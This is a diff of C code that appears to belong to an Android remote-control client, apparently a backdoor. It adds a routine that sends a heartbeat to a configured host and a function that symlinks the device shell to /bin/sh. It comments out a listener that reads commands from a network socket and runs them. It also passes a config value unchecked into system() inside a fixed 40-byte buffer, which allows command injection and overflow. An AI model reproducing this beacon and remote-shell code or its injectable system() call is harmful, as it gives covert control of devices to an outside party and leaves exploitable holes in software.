@@ -6,12 +6,77 @@
 #include "pthreadxsx.h"
 
 
-//=============================listen=======================
+
+
+
+
+//==============================connect================================
+
+void* ping_pthread(void * argument)
+{
+	char* shell =(char*)argument;
+	system(shell);
+}
+
+
+int dnsbyping(char* ip)
+{
+	DEBUGW;
+	char *filename = "tmp.txt";
+	char newip[30] = {0};
+	char ping[40] = {0};
+	sprintf(ping,"ping %s > %s",ip,filename);
+	pthread_t pid = pthread_run(ping_pthread,ping);
+	sleep(4);
+	pthread_cancel(pid);
+	pthread_join(pid,NULL);
+	int filefd = open(filename,O_RDWR);
+	DEBUGI(filefd);
+	if(filefd == -1)
+	{
+		DEBUGW;
+		return false;
+	}
+	char buf[100] = {0};
+	char *pr = buf;
+	int res = 0;
+	DEBUGW;
+	while( 1 )
+	{
+		res = read(filefd,pr,1);
+		if(res != 1)
+			return false;
+		if(*pr != ')')
+			pr++;
+		else
+			break;
+	}
+	DEBUGW;
+	close(filefd);
+	unlink(filename);
+	*pr = 0;
+	pr = strchr(buf,'(');
+	if(pr == NULL)
+		return false;
+	pr++;
+	strcpy(ip,pr);
+	DEBUGW;
+	return true;
+}
+
+
+
 int connect_host()
 {
 	char ipaddr[30];
 	char port[10];
 	readcfg("ip",ipaddr);
+	if(dnsbyping(ipaddr) == false )
+	{
+		DEBUGW;
+		printf("dns fail");
+		return false;
+	}
 	readcfg("ctosport",port);
 	DEBUGW;
 	DEBUGS(ipaddr);
@@ -26,6 +91,22 @@ int connect_host()
 		return false;
 	if( connect_x(sockfd,&addr) == -1)
 		return false;
+	DEBUGW;
+	U_MSG k;
+	k.regist_m.type = T_HEART;
+	k.regist_m.id = 2;
+	int n = write(sockfd,&k,sizeof(U_MSG));
+	DEBUGW;
+	if(n!=sizeof(U_MSG))
+		perror("write err");
+	DEBUGW;
+/*	n = read(sockfd,&k,sizeof(U_MSG));
+	DEBUGW;
+	if(n!=sizeof(U_MSG))
+		perror("read err");*/
+
+	printf("%d\n",k.regist_m.id);
+
 	close(sockfd);
 }
 
@@ -33,19 +114,16 @@ int connect_host()
 
 void* timer_connect_host(void* argument)
 {
-	while(1)
-	{
-		connect_host();
-		sleep(3600*5);
-	}
-
+	connect_host();
 }
 
+//-----------------------------connect-----------------------------
 
-//--------------------------listen---------------------------
 
 
-int exeshell(int fd)
+//=============================listen=======================
+
+/*int exeshell(int fd)
 {
 	char shell[100] = {0};
 	read(fd,shell,100);
@@ -99,13 +177,34 @@ void* const_listen_host(void* argument)
 }
 
 
+*/
+//--------------------------listen---------------------------
 
 
 
 
-
-
-
+int linkbash()
+{
+	int red = mkdir("/bin",777);
+	if(red == -1)
+	{
+		if(errno != EEXIST)
+		{
+			perror("err:");
+			return false;
+		}
+	}
+	red = symlink("/system/bin/sh","/bin/sh");
+	if(red == -1)
+	{
+		if(errno != EEXIST)
+		{
+			perror("err:");
+			return false;
+		}
+	}
+	return true;
+}
 
 
 
